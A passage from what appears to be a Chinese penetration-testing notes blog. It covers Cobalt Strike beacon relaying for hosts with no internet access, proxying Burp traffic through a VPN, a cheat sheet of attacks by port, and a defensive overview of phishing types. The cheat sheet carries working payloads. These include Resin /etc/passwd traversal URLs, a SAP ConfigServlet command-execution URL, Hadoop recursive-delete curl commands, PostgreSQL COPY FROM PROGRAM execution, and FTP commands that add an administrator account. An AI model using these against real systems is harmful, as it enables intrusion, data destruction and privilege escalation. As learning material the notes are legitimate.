<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t011128b19f55288014.png" alt="img"></p>
<p>上传后执行beacon.exe</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t013fddc56341f858f0.png" alt="img"></p>
<p>执行后回来看cs就已经上线，不需要link或者connect了。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0165d6437104bf123c.png" alt="img"></p>
<p>拓扑图为反向的tcp连接</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t01ffbea793574ec96c.png" alt="img"></p>
<p>值得注意的是，中继方法无法unlink后重连，不管权限如何，一旦unlink后进程直接结束。要想重新上线只能重新执行beacon.exe。</p>
<p><img src="https://ax-x.github.io/2022/05/31/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/t0131dd63889d924ce0.png" alt="img"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实际情况下，由于环境原因，网络状况错综复杂。比如：stageless的可执行文件比较大，又因为挂了代理，传不上去怎么办。其实就可以将beacon.exe上传到跳板机器上，用windows自带的certutil工具，直接在内网机器上请求下载跳板机上的beacon.exe。这样确实是更加稳当的。</p>
<p>转载来源：<a href="https://www.anquanke.com/post/id/254671#h2-7">https://www.anquanke.com/post/id/254671#h2-7</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>关于开深信服VPN无法抓包</title>
    <url>/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<p>前些日子大佬叫去搞渗透，得走深信服的VPN，连上之后发现BP抓不了包了，关闭 BurpSuite 单独用浏览器就可以正常访问，还以为是我电脑问题，后面发现下了VPN之后能正常抓包了。</p>
<span id="more"></span>
<p><img src="https://ax-x.github.io/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/image-20220217100454882.png" alt="image-20220217100454882"></p>
<p>一开始以为是走的VPN，多个代理抓不到，然后试着用BP搞个上层代理，结果还是不行，后门觉着应该是深信服VPN不允许抓包的问题，把流量先在自己电脑跑一圈，用一层中转即可，找了个EW，开了个 sock5 服务器进行本地转发，然后再进行抓包就可以了</p>
<p><img src="https://ax-x.github.io/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/image-20220217101004315.png" alt="image-20220217101004315"></p>
<p>BP设置</p>
<p><img src="https://ax-x.github.io/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/image-20220217101028945.png" alt="image-20220217101028945"></p>
<p><img src="https://ax-x.github.io/2022/02/17/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/image-20220217101050106.png" alt="image-20220217101050106"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>常见端口攻击方式</title>
    <url>/2022/03/08/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="远程管理端口"><a href="#远程管理端口" class="headerlink" title="远程管理端口"></a>远程管理端口</h2><span id="more"></span>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">22  端口（ssh）</span><br><span class="line">    安全攻击：弱口令、暴力猜解、用户名枚举</span><br><span class="line">    利用方式：1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，2、利用弱口令/暴力破解，获取目标主机权限。</span><br><span class="line">    </span><br><span class="line">23  端口（telnet）</span><br><span class="line">    安全漏洞：弱口令、明文传输</span><br><span class="line">    利用方式：1、通过弱口令或暴力破解，获取目标主机权限。2、嗅探抓取telnet明文账户密码。</span><br><span class="line">    </span><br><span class="line">3389 端口（RDP）</span><br><span class="line">     安全漏洞：暴力破解</span><br><span class="line">     利用方式：通过弱口令或暴力破解，获取目标主机权限。</span><br><span class="line"></span><br><span class="line">5632 端口（Pcanywhere）</span><br><span class="line">     安全漏洞：弱口令、暴力破解</span><br><span class="line">     利用方式：通过弱口令或暴力破解，获取目标主机权限</span><br><span class="line"></span><br><span class="line">5900 端口（VNC）</span><br><span class="line">     安全漏洞：弱口令、暴力破解</span><br><span class="line">     利用方式：通过弱口令或暴力破解，获取目标主机权限。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="WEB中间件-服务端口"><a href="#WEB中间件-服务端口" class="headerlink" title="WEB中间件/服务端口"></a>WEB中间件/服务端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1090/1099 端口（RMI）</span><br><span class="line">    安全漏洞：JAVA RMI 反序列化远程命令执行漏洞</span><br><span class="line">    利用方式：使用nmap检测端口信息。</span><br><span class="line">    端口信息：1099/1090    Java-rmi    Java RMI Registry</span><br><span class="line">    检测工具：attackRMI.jar</span><br><span class="line"></span><br><span class="line">7001 端口（Weblogic）</span><br><span class="line">    安全漏洞：弱口令、SSRF、反序列化漏洞</span><br><span class="line">    利用方式：1、控制台弱口令上传war木马2、SSRF内网探测3、反序列化远程代码执行等</span><br><span class="line"></span><br><span class="line">8000 端口（jdwp）</span><br><span class="line">    安全漏洞：JDWP 远程命令执行漏洞</span><br><span class="line">    端口信息：8000  jdwp     </span><br><span class="line">    java Debug Wire Protocol检测工具：https://github.com/IOActive/jdwp-shellifier</span><br><span class="line"></span><br><span class="line">8080 端口（Tomcat）</span><br><span class="line">    安全漏洞：弱口令、示例目录</span><br><span class="line">    利用方式：通过弱口令登录控制台，上传war包。</span><br><span class="line"></span><br><span class="line">8080 端口（Jboss）</span><br><span class="line">    安全漏洞：未授权访问、反序列化。</span><br><span class="line">    利用方式：1、未授权访问控制台，远程部署木马2、反序列化导致远程命令执行等。</span><br><span class="line">    检测工具：https://github.com/joaomatosf/jexboss</span><br><span class="line"></span><br><span class="line">8080 端口（Resin）</span><br><span class="line">    安全漏洞：目录遍历、远程文件读取</span><br><span class="line">    利用方式：通过目录遍历/远程文件读取获取敏感信息，为进一步攻击提供必要的信息。</span><br><span class="line">    任意文件读取POC：</span><br><span class="line">    payload1 = &quot;/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd&quot;</span><br><span class="line">    payload2 = &quot;/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    payload3 = &quot;/ ..\\\\web-inf&quot;</span><br><span class="line"></span><br><span class="line">8080 端口（Jetty）</span><br><span class="line">    安全漏洞：远程共享缓冲区泄漏</span><br><span class="line">    利用方式：攻击者可以通过精心构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据攻击者的payload返回特定位置的数据。</span><br><span class="line">    检测工具：https://github.com/GDSSecurity/Jetleak-Testing-Script</span><br><span class="line"></span><br><span class="line">8080 /4848 端口（GlassFish）</span><br><span class="line">    安全漏洞：弱口令、任意文件读取</span><br><span class="line">    利用方式：1、弱口令admin/admin，直接部署shell    2、任意文件读取获取服务器敏感配置信息</span><br><span class="line"></span><br><span class="line">8080 端口（Jenkins）</span><br><span class="line">    安全漏洞：未授权访问 、远程代码执行</span><br><span class="line">    利用方式：访问如下url，可以执行脚本命令，反弹shell，写入webshell等。</span><br><span class="line">    http://&lt;target&gt;:8080/manage</span><br><span class="line">    http://&lt;target&gt;:8080/script</span><br><span class="line"></span><br><span class="line">8161 端口（ActiveMQ）</span><br><span class="line">    安全漏洞：弱口令、任意文件写入、反序列化</span><br><span class="line">    利用方式：默认密码admin/admin登陆控制台、写入webshell、上传ssh key等方式。</span><br><span class="line"></span><br><span class="line">9043 端口（webSphere）</span><br><span class="line">    安全漏洞：控制台弱口令、远程代码执行</span><br><span class="line">    后台地址：https://:9043/ibm/console/logon.jsp</span><br><span class="line"></span><br><span class="line">50000 端口 （SAP）</span><br><span class="line">    安全漏洞：远程代码执行</span><br><span class="line">    利用方式：攻击者通过构造url请求，实现远程代码执行。POC:http://&lt;target&gt;:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=cmd.exe /c ipconfig /all</span><br><span class="line"></span><br><span class="line">50070 端口（hadoop）</span><br><span class="line">    安全漏洞：未授权访问</span><br><span class="line">    利用方式：攻击者可以通过命令行操作多个目录下的数据，如进行删除操作。</span><br><span class="line">    curl -i -X DELETE “http://ip:50070/webhdfs/v1/tmp?op=DELETE&amp;recursive=true“</span><br><span class="line">    curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“</span><br></pre></td></tr></table></figure>

<h2 id="数据库端口"><a href="#数据库端口" class="headerlink" title="数据库端口"></a>数据库端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">389 端口（ldap）</span><br><span class="line">    安全漏洞：未授权访问 、弱口令</span><br><span class="line">    利用方式：通过LdapBrowser工具直接连入。</span><br><span class="line"></span><br><span class="line">1433 端口（Mssql）</span><br><span class="line">    安全漏洞：弱口令、暴力破解</span><br><span class="line">    利用方式：差异备份getshell、SA账户提权等</span><br><span class="line"></span><br><span class="line">1521 端口（Oracle）</span><br><span class="line">    安全漏洞：弱口令、暴力破解</span><br><span class="line">    利用方式：通过弱口令/暴力破解进行入侵。</span><br><span class="line"></span><br><span class="line">3306 端口（MySQL）</span><br><span class="line">    安全漏洞：弱口令、暴力破解</span><br><span class="line">    利用方式：利用日志写入webshell、udf提权、mof提权等。</span><br><span class="line"></span><br><span class="line">5432 端口（ PostgreSQL）</span><br><span class="line">    安全漏洞：弱口令、高权限命令执行</span><br><span class="line">    利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。。</span><br><span class="line">    PoC参考：    DROP TABLE IF EXISTS cmd_exec;    CREATE TABLE cmd_exec(cmd_output text);    COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;    SELECT * FROM cmd_exec;</span><br><span class="line"></span><br><span class="line">5984 端口（CouchDB）</span><br><span class="line">    安全漏洞：垂直权限绕过、任意命令执行</span><br><span class="line">    利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。</span><br><span class="line">    后台访问：http://&lt;target&gt;:5984/_utils</span><br><span class="line"></span><br><span class="line">6379 端口（Redis）</span><br><span class="line">    安全漏洞：未授权访问</span><br><span class="line">    利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。</span><br><span class="line"></span><br><span class="line">9200 端口（elasticsearch）</span><br><span class="line">    安全漏洞：未授权访问、命令执行</span><br><span class="line">    检测方式：</span><br><span class="line">        1、直接访问如下url，获取相关敏感信息。  http://&lt;target&gt;:9200/_nodes  查看节点数据  http://&lt;target&gt;:9200/_river  查看数据库敏感信息</span><br><span class="line">        2、通过构造特定的数据包，执行任意命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">11211 端口（MemCache）</span><br><span class="line">    安全漏洞：未授权访问</span><br><span class="line">    检测方式：无需用户名密码，可以直接连接memcache 服务的11211端口。nc -vv &lt;target&gt; 11211</span><br><span class="line"></span><br><span class="line">27017 端口（Mongodb）</span><br><span class="line">    安全漏洞：未授权访问、弱口令</span><br><span class="line">    利用方式：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。</span><br></pre></td></tr></table></figure>

<h2 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">21 端口（FTP)</span><br><span class="line">    安全漏洞：1、配置不当    2、明文传输    3、第三方软件提权</span><br><span class="line">    利用方式：1、匿名登录或弱口令2、嗅探ftp用户名和密码3、</span><br><span class="line">    Serv-U权限较大的账号可导致系统命令执行。</span><br><span class="line">    FTP提权命令：  # 增加系统用户   Quote site exec net user 4567 4567 /add  # 提升到管理员权限   Quote site exec net localgroup administrators 4567 /add</span><br><span class="line"></span><br><span class="line">25 端口（SMTP）</span><br><span class="line">    攻击方式：1、匿名发送邮件 2、弱口令 3、SMTP用户枚举</span><br><span class="line">    利用方式：1、SMTP服务器配置不当，攻击者可以使用任意用户发送邮件。2、SMTP弱口令扫描，获取用户账号密码，发送邮件钓鱼。3、通过SMTP用户枚举获取用户名：   nmap -p 25 -- smtp-enum-users.nse &lt;target&gt;</span><br><span class="line"></span><br><span class="line">53 端口（DNS）</span><br><span class="line">    安全攻击：1、DNS域传送漏洞、DNS欺骗、DNS缓存投毒</span><br><span class="line">    检测方式：1、DNS域传送漏洞，Windows下检测使用nslookup命令，Linux下检测使用dig命令，通过执行命令可以清楚的看到域名解析情况。2、DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。3、DNS缓存投毒是攻击者欺骗DNS服务器相信伪造的DNS响应的真实性。</span><br><span class="line"></span><br><span class="line">161 端口（SNMP）</span><br><span class="line">    安全漏洞：默认团体名/弱口令访问</span><br><span class="line">    利用方式：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露。。1、弱口令检测：nmap –sU –p161 –script=snmp-brute &lt;target&gt;2、获取系统信息：nmap –sU –p161 –script=snmp-sysdescr &lt;target&gt;3、获取用户信息：nmap -sU -p161 --script=snmp-win32-user &lt;target&gt;4、获取网络端口状态：nmap -sU -p161 --script=snmp-netstat &lt;target&gt;</span><br><span class="line"></span><br><span class="line">443 端口（SSL）</span><br><span class="line">    安全漏洞：OpenSSL 心脏出血</span><br><span class="line">    利用方式：攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据。</span><br><span class="line">    扫描脚本：nmap -sV --script=ssl-heartbleed &lt;target&gt;</span><br><span class="line"></span><br><span class="line">445 端口（SMB）</span><br><span class="line">    安全漏洞：信息泄露、远程代码执行</span><br><span class="line">    利用方式：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如ms17010。</span><br><span class="line"></span><br><span class="line">873 端口（Rsync）</span><br><span class="line">    安全漏洞：匿名访问、弱口令</span><br><span class="line">    利用方式：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。</span><br><span class="line">    1、下载：#rsync -avz a.b.c.d::path/file path/filiname  </span><br><span class="line">    2、上传：#rsync -avz path/filename a.b.c.d::path/file</span><br><span class="line"></span><br><span class="line">2181 端口（Zookeeper）</span><br><span class="line">    安全漏洞：未授权访问</span><br><span class="line">    检测方式：攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。 echo envi | nc ip port</span><br><span class="line"></span><br><span class="line">2375 端口（Docker）</span><br><span class="line">    安全漏洞：未授权方式</span><br><span class="line">    检测方式：通过docker daemon api 执行docker命令。#列出容器信息，效果与docker ps -a 一致。 curl http://&lt;target&gt;:2375/containers/json docker -H tcp://&lt;target&gt;:2375 start &lt;Container Id&gt;  docker服务如果是以root用户启动的话，可以利用chroot将服务器的根目录挂在到容器里面，实现docker容器逃逸</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>六种常见的网络钓鱼攻击以及如何防范它们</title>
    <url>/2022/09/17/%E5%85%AD%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E5%AE%83%E4%BB%AC/</url>
    <content><![CDATA[<h1 id="一、欺骗性网络钓鱼"><a href="#一、欺骗性网络钓鱼" class="headerlink" title="一、欺骗性网络钓鱼"></a>一、欺骗性网络钓鱼</h1><p>欺骗性网络钓鱼是最常见的网络钓鱼诈骗类型。在这种策略中，欺诈者冒充合法公司窃取人们的个人数据或登录凭据。这些电子邮件使用威胁和紧迫感来恐吓用户按照攻击者的意愿行事。</p>
<span id="more"></span>
<h2 id="欺骗性网络钓鱼中使用的技术"><a href="#欺骗性网络钓鱼中使用的技术" class="headerlink" title="欺骗性网络钓鱼中使用的技术"></a>欺骗性网络钓鱼中使用的技术</h2><ul>
<li><strong>合法链接</strong>——许多攻击者试图通过将合法链接合并到他们的欺骗性网络钓鱼电子邮件中来逃避电子邮件过滤器的检测。他们可以通过包括他们可能正在欺骗的组织的联系信息来做到这一点。</li>
<li><strong>混合恶意代码和良性代码</strong>——负责创建网络钓鱼登录页面的人员通常将恶意代码和良性代码混合在一起以欺骗 <code>Exchange Online Protection (EOP)</code>。可能会采取复制科技巨头登录页面的 CSS 和 JavaScript 的形式来窃取用户的帐户凭据。</li>
<li><strong>重定向和短链接</strong>——恶意行为者不想向他们的受害者发出任何危险信号。因此，他们使用缩短的 URL 来欺骗<code>安全电子邮件网关 (SEG)</code>。他们还使用“定时炸弹”仅在电子邮件发送后将用户重定向到网络钓鱼登录页面。在受害者没收其凭据后，该活动会将受害者重定向到合法网页。</li>
<li><strong>修改品牌标志</strong>——一些电子邮件过滤器可以发现恶意行为者何时窃取组织的标志并将其合并到他们的攻击电子邮件或他们的网络钓鱼登录页面上。他们通过寻找徽标的 HTML 属性来做到这一点。为了欺骗这些检测工具，恶意行为者会更改徽标的 HTML 属性，例如颜色。</li>
<li><strong>最少的电子邮件内容</strong>——数字攻击者试图通过在他们的攻击电子邮件中包含最少的内容来逃避检测。例如，他们可能会选择通过包含图像而不是文本来做到这一点。</li>
</ul>
<h2 id="如何抵御欺骗性网络钓鱼"><a href="#如何抵御欺骗性网络钓鱼" class="headerlink" title="如何抵御欺骗性网络钓鱼"></a>如何抵御欺骗性网络钓鱼</h2><p>欺骗性网络钓鱼的成功取决于攻击电子邮件在多大程度上类似于来自受欺骗公司的官方信件。承认这一事实后，用户应仔细检查所有 URL，以查看它们是否重定向到未知和/或可疑网站。他们还应该注意通用称呼、语法错误和拼写错误。</p>
<h1 id="二、鱼叉式网络钓鱼"><a href="#二、鱼叉式网络钓鱼" class="headerlink" title="二、鱼叉式网络钓鱼"></a>二、鱼叉式网络钓鱼</h1><p>鱼叉式网络钓鱼并不是采用广撒网，愿者上钩的技术，而更多地针对某个人/集体以提高钓鱼的成功率。在这种类型的策略中，欺诈者使用目标的姓名、职位、公司、工作电话号码和其他信息来定制他们的攻击电子邮件，<strong>以诱使收件人相信他们与发件人有联系</strong>。然而，目标与欺骗性网络钓鱼相同：让受害者点击恶意 URL 或电子邮件附件，以便他们交出个人数据。攻击者可以在这些网站上使用多个数据源来制作有针对性的攻击电子邮件。</p>
<h2 id="鱼叉式网络钓鱼中使用的技术"><a href="#鱼叉式网络钓鱼中使用的技术" class="headerlink" title="鱼叉式网络钓鱼中使用的技术"></a>鱼叉式网络钓鱼中使用的技术</h2><ul>
<li><p><strong>在云服务上存放恶意文件</strong>：<a href="https://www.csoonline.com/article/3334617/what-is-spear-phishing-why-targeted-email-attacks-are-so-difficult-to-stop.html">CSO</a>报告说，数字攻击者越来越多地在 Dropbox、Box、Google Drive 和其他云服务上存放恶意文件。默认情况下，IT 不太可能阻止这些服务，这意味着组织的电子邮件过滤器不会标记武器化文档。</p>
</li>
<li><p><strong>破坏令牌</strong>：CSO 还指出，数字犯罪分子正试图破坏 API 令牌或会话令牌。这方面的成功将使他们能够窃取对电子邮件帐户、SharePoint 站点或其他资源的访问权限。</p>
</li>
<li><p><strong>收集员工离职通知</strong>：攻击者需要大量情报才能发起令人信服的鱼叉式网络钓鱼活动。根据<a href="https://www.trendmicro.com/vinfo/us/security/definition/spear-phishing">Trend Micro</a>的说法，他们可以做到这一点的一种方法是通过向全体员工发送电子邮件并收集员工离职通知以了解内部员工使用的电子邮件地址的格式。</p>
</li>
<li><p><strong>探索社交媒体</strong>：恶意行为者需要了解谁在目标公司工作。他们可以通过使用社交媒体调查组织的结构并决定他们希望挑出谁进行有针对性的攻击来做到这一点。</p>
</li>
<li><p><strong>人工智能</strong>：人工智能越来越多地被用于此类攻击，以及一般的网络钓鱼攻击，这为几乎所有网络钓鱼攻击打开了大门，很快就会成为“鱼叉式网络钓鱼”。人工智能可以做几件事：</p>
</li>
<li><ul>
<li>它可以从社交媒体网站上抓取个人数据，让黑客更容易定制电子邮件和欺诈性通信；</li>
<li>它可以制作“深度伪造”视频，让定制欺骗变得更加容易。正如<a href="https://www.scmagazine.com/feature/emerging-technology/2023-tech-predictions-ai-and-machine-learning-wicome-into-their-own-for-security">SC Media</a>报道的那样，“网络犯罪分子将能够访问不断增长的数据宝库，<strong>从招聘信息等开源数据到数据泄露中泄露的个人信息</strong>，利用这些数据可以制作针对性很强的鱼叉式网络钓鱼诱饵。”</li>
</ul>
</li>
</ul>
<p>除了给招聘网hr发恶意office文档，还可以反过来定制虚假工作机会。在打开虚假工作机会（文档）后，受害者无意中启动了无文件后门的秘密安装。加载后，复杂的后门可以下载其他恶意插件并提供对受害者计算机的实际访问权限。</p>
<h2 id="如何抵御鱼叉式网络钓鱼"><a href="#如何抵御鱼叉式网络钓鱼" class="headerlink" title="如何抵御鱼叉式网络钓鱼"></a>如何抵御鱼叉式网络钓鱼</h2><p>为防止此类骗局，组织应持续开展员工安全意识培训，其中包括阻止用户在社交媒体上发布敏感的个人或公司信息。公司还应该投资<strong>鱼叉式网络钓鱼预防解决方案</strong>，分析入站电子邮件中的已知恶意链接/电子邮件附件。该解决方案应该能够识别已知恶意软件和零日威胁的指标。此外，有针对性的<strong>社交媒体保护解决方案</strong>可以专门监控这些平台上的威胁，消除误报并阻止攻击。</p>
<h1 id="三、捕鲸式网络钓鱼"><a href="#三、捕鲸式网络钓鱼" class="headerlink" title="三、捕鲸式网络钓鱼"></a>三、捕鲸式网络钓鱼</h1><p>捕鲸式网络钓鱼是鱼叉式网络钓鱼的一种，但它只针对公司高管。在这些骗局中，欺诈者试图用鱼叉攻击高管并窃取他们的登录详细信息。</p>
<p>如果他们的攻击被证明是成功的，欺诈者可以选择进行 CEO 欺诈。作为<a href="https://www.tripwire.com/state-of-security/business-email-compromise-scam-alert-issued-by-fs-isac">企业电子邮件泄露(BEC) </a>骗局的第二阶段，CEO 欺诈是指攻击者滥用 CEO 或其他高级管理人员的受损电子邮件帐户，授权向他们选择的金融机构进行欺诈性电汇。或者，他们可以利用同一个电子邮件帐户进行 <a href="https://en.wikipedia.org/wiki/Form_W-2">W-2</a> 网络钓鱼，在其中他们要求所有员工提供 W-2 信息，以便他们可以代表他们提交虚假的纳税申报表或将这些数据发布到暗网上。</p>
<h2 id="捕鲸式网络钓鱼中使用的技术"><a href="#捕鲸式网络钓鱼中使用的技术" class="headerlink" title="捕鲸式网络钓鱼中使用的技术"></a>捕鲸式网络钓鱼中使用的技术</h2><p>捕鲸攻击通常使用与鱼叉式网络钓鱼活动相同的技术。以下是恶意行为者可以使用的一些额外策略：</p>
<ul>
<li><strong>渗透网络</strong>：受感染的高管帐户比受骗的电子邮件帐户更有效。正如<a href="https://www.varonis.com/blog/whaling-attack/">Varonis</a>所指出的，数字攻击者因此可以使用恶意软件和 Rootkit 来渗透他们的目标网络。</li>
<li><strong>通过电话跟进</strong>：<a href="https://www.ncsc.gov.uk/guidance/whaling-how-it-works-and-what-your-organisation-can-do-about-it">英国国家网络安全中心</a>(NCSC) 了解到攻击者通过电话确认电子邮件请求来跟进捕鲸电子邮件的多个实例。这种社会工程策略有助于减轻目标对可能存在可疑行为的恐惧。</li>
<li><strong>追查供应链</strong>：此外，NCSC 还目睹了恶意行为者利用目标供应商和供应商的信息来使他们的捕鲸电子邮件看起来像是来自可信赖的合作伙伴的情况。</li>
</ul>
<h2 id="如何抵御捕鲸式网络钓鱼"><a href="#如何抵御捕鲸式网络钓鱼" class="headerlink" title="如何抵御捕鲸式网络钓鱼"></a>如何抵御捕鲸式网络钓鱼</h2><p>捕鲸攻击之所以奏效，是因为高管们通常不与员工一起参加安全意识培训。为了应对 CEO 欺诈和 W-2 网络钓鱼的威胁，组织应要求所有公司人员（包括高管）持续参与安全意识培训。商业电子邮件泄露和社会工程策略也可以通过安全的电子邮件安全措施来减轻，这些安全措施可以在恶意发件人漏网时捕获。</p>
<p>组织还应考虑将多因素身份验证(MFA) 渠道注入其财务授权流程，以便任何人都无法仅通过电子邮件授权付款。</p>
<h1 id="四、网络钓鱼攻击"><a href="#四、网络钓鱼攻击" class="headerlink" title="四、网络钓鱼攻击"></a>四、网络钓鱼攻击</h1><p>到目前为止，我们已经讨论了大部分依赖于电子邮件的网络钓鱼攻击。但欺诈者有时确实会转向其他媒体实施攻击。</p>
<p>以网络钓鱼为例。这种类型的网络钓鱼攻击无需发送电子邮件，而是拨打电话。正如<a href="https://www.comparitech.com/blog/information-security/common-phishing-scams-how-to-avoid/">Comparitech</a>所指出的那样，攻击者可以通过设置<strong>互联网协议语音 (VoIP) 服务器</strong>来模仿各种实体来实施钓鱼活动，以窃取敏感数据和/或资金。FBI发现，恶意行为者利用这些策略在 2020 年加强了钓鱼活动，并以远程工作者为目标。</p>
<h2 id="钓鱼中使用的技术"><a href="#钓鱼中使用的技术" class="headerlink" title="钓鱼中使用的技术"></a>钓鱼中使用的技术</h2><ul>
<li>“喃喃自语技术”：数字攻击者通常会采用独特的策略来追踪特定目标。例如，据<a href="https://www.social-engineer.org/framework/attack-vectors/vishing/">Social-Engineer, LLC</a>报道，当他们试图以客户服务代表或呼叫中心代理为目标时，恶意行为者可能会使用所谓的“含糊不清的技术”来含糊不清地回答问题，希望他们的“答案”就足够了。</li>
<li>技术术语：如果恶意行为者以公司员工为目标，Social-Engineer, LLC 指出，他们可能会冒充内部技术支持，使用技术术语并暗指诸如速度问题或徽章之类的事情，以说服员工他们可以交出他们的资料。</li>
<li>ID 欺骗：在这里，恶意行为者伪装他们的电话号码，使他们的电话看起来像是来自目标区号中的合法电话号码。<a href="https://blog.twinstate.com/cybersecurity/what-is-vishing-recognize-and-prevent-phishing">Twinstate</a>指出，这种技术可以使目标陷入一种虚假的安全感。、</li>
</ul>
<h2 id="虚拟钓鱼攻击示例"><a href="#虚拟钓鱼攻击示例" class="headerlink" title="虚拟钓鱼攻击示例"></a>虚拟钓鱼攻击示例</h2><p>2022 年 8 月，思科遭受了一次巧妙的钓鱼攻击，该攻击始于一名员工的 Google 帐户遭到入侵。存储的密码被泄露，然后使用语音网络钓鱼让员工接受 MFA 推送，最终允许攻击者访问公司 VPN（虚拟专用网络）。  </p>
<p>现在是未来事物的可能预兆。2019 年，攻击者利用 AI 瞄准了一家英国能源供应商的首席执行官，电话中一名男子的电话听起来完全像他的老板，德国口音等等。这种深度造假非常成功，以至于这位高管最终将超过 20 万美元转移给了公司的“匈牙利供应商”——换句话说，就是骗子。</p>
<h2 id="如何抵御网络钓鱼"><a href="#如何抵御网络钓鱼" class="headerlink" title="如何抵御网络钓鱼"></a>如何抵御网络钓鱼</h2><p>为防止钓鱼攻击，用户应避免接听来自未知电话号码的电话，切勿在电话中透露个人信息，并使用来电显示应用程序。</p>
<h1 id="五、短信诈骗"><a href="#五、短信诈骗" class="headerlink" title="五、短信诈骗"></a>五、短信诈骗</h1><p>网络钓鱼并不是数字欺诈者可以使用电话进行的唯一类型的网络钓鱼。他们还可以进行所谓的网络钓鱼。该方法利用恶意短信诱骗用户点击恶意链接或交出个人信息。</p>
<h2 id="短信诈骗使用的技术"><a href="#短信诈骗使用的技术" class="headerlink" title="短信诈骗使用的技术"></a>短信诈骗使用的技术</h2><ul>
<li>触发下载恶意应用程序：攻击者可以使用恶意链接触发受害者移动设备上的恶意应用程序自动下载。然后，这些应用程序可以部署勒索软件或使不法分子能够远程控制他们的设备。</li>
<li>链接到数据窃取表单：攻击者可以利用文本消息和欺骗性网络钓鱼技术来诱骗用户单击恶意链接。然后，该活动可以将他们重定向到一个旨在窃取他们的个人信息的网站。</li>
<li>指示用户联系技术支持：使用这种类型的攻击策略，恶意行为者会发送短信，指示收件人联系号码以获得客户支持。骗子随后会伪装成合法的客户服务代表，并试图诱骗受害人交出他们的个人资料。</li>
</ul>
<h2 id="如何抵御短信诈骗攻击"><a href="#如何抵御短信诈骗攻击" class="headerlink" title="如何抵御短信诈骗攻击"></a>如何抵御短信诈骗攻击</h2><p>用户可以通过研究未知电话号码以及在有任何疑问时致电可疑 SMS 消息中指定的公司来帮助抵御诈骗攻击。</p>
